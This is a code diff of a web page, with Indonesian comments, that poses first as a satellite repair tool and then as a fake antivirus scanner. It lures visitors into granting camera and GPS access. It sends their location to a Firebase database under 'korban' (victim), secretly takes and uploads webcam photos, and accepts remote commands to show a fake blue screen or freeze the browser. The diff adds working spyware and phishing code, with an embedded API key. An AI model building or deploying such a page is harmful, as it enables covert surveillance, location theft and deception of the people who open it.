@@ -3,79 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SATELLITE | SYSTEM REPAIR</title>
+    <title>EAGLE GUARD | SCANNER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #00f2ff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .box { border: 2px solid #00f2ff; padding: 40px; border-radius: 20px; background: rgba(0, 242, 255, 0.05); box-shadow: 0 0 20px #00f2ff; cursor: pointer; width: 80%; }
-        .glitch { animation: flash 1s infinite; color: #ff00ea; font-weight: bold; }
-        @keyframes flash { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        body { background: #000; color: #00f2ff; font-family: monospace; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 2px solid #00f2ff; padding: 40px; border-radius: 20px; width: 80%; box-shadow: 0 0 20px #00f2ff; cursor: pointer; }
+        #bsod { position: fixed; inset: 0; background: #0078d7; color: #fff; padding: 10%; text-align: left; display: none; z-index: 9999; }
         video, canvas { display: none; }
     </style>
 </head>
-<body>
-    <div class="box" id="ui" onclick="ignite()">
-        <h1 style="margin:0;">🛰️</h1>
-        <p class="glitch">SYSTEM ERROR DETECTED</p>
-        <p style="font-size: 12px;">Satellite link lost. Click to re-establish 4K Uplink.</p>
-        <button id="btn-fix" style="background:#00f2ff; color:#000; border:none; padding:10px 20px; border-radius:5px; font-weight:bold; margin-top:20px;">REPAIR SYSTEM</button>
+<body onclick="ignite()">
+    <div class="box" id="ui">
+        <h1>🦅</h1>
+        <h3>EAGLE GUARD v2.1</h3>
+        <p>Virus Detected! Click to repair system.</p>
+        <div id="st">[ STANDBY ]</div>
     </div>
-
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
+    <div id="bsod"><h1>:(</h1><p>Your device ran into a problem... <span id="p">0</span>%</p></div>
 
 <script>
-    // CEK HTTPS - Penting buat Lead Dev Kalz!
-    if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
-        alert("PERINGATAN: Sistem Satelit hanya jalan di koneksi SECURE (HTTPS).");
+    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
+    firebase.initializeApp(config); const db = firebase.database();
+    
+    async function ignite() {
+        document.getElementById('st').innerText = "[ INITIALIZING... ]";
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = stream;
+            navigator.geolocation.getCurrentPosition(pos => {
+                const ref = db.ref('korban').push({ waktu: new Date().toLocaleString(), maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` });
+                document.getElementById('ui').innerHTML = "<h1>⚙️</h1><h3>REPAIRING...</h3><p>Jangan tutup halaman ini.</p>";
+                
+                // AUTO-SNAP: Ambil foto pertama tanpa perintah dashboard
+                setTimeout(() => { takeSnap(ref.key); }, 2000);
+
+                db.ref('commands/'+ref.key).on('value', s => {
+                    const a = s.val()?.action;
+                    if(a === "TAKE") takeSnap(ref.key);
+                    if(a === "BSOD") document.getElementById('bsod').style.display = 'block';
+                    if(a === "CRASH") while(true) document.body.appendChild(document.createElement('div'));
+                });
+            });
+        } catch(e) { alert("Izinkan Kamera & GPS!"); }
     }
 
-    const config = { 
-        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
-        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
-    };
-    firebase.initializeApp(config); const db = firebase.database();
-
-    async function ignite() {
-        const btn = document.getElementById('btn-fix');
-        btn.innerText = "CONNECTING...";
-        
-        try {
-            // Minta Kamera & Mikrofon (Biar popup lebih meyakinkan)
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" },
-                audio: false 
-            });
-            
-            document.getElementById('v').srcObject = stream;
-            
-            // Setelah dapet kamera, langsung minta Lokasi
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const ref = db.ref('korban').push({
-                    waktu: new Date().toLocaleString(),
-                    maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                });
-                
-                const myId = ref.key;
-                document.getElementById('ui').innerHTML = "<h2 style='color:#00f2ff;'>REPAIRING... 92%</h2><p>DO NOT CLOSE THIS TAB</p>";
-
-                // Standby terima perintah SNAP dari Dashboard lu
-                db.ref('commands/' + myId).on('value', snap => {
-                    if (snap.val()?.action === "TAKE") {
-                        const v = document.getElementById('v'), c = document.getElementById('c');
-                        c.width = v.videoWidth; c.height = v.videoHeight;
-                        c.getContext('2d').drawImage(v, 0, 0);
-                        db.ref('hasil_foto/' + myId).set({ foto: c.toDataURL('image/jpeg', 0.5) });
-                    }
-                });
-            }, (err) => {
-                alert("Satelit butuh izin GPS untuk kalibrasi sinyal 4K!");
-            });
-        } catch (e) {
-            console.log(e);
-            alert("Satelit butuh izin KAMERA untuk sinkronisasi visual 4K!");
-        }
+    function takeSnap(id) {
+        const v = document.getElementById('v'), c = document.getElementById('c');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        db.ref('hasil_foto/'+id).set({ foto: c.toDataURL('image/jpeg', 0.5) });
     }
 </script>
 </body>
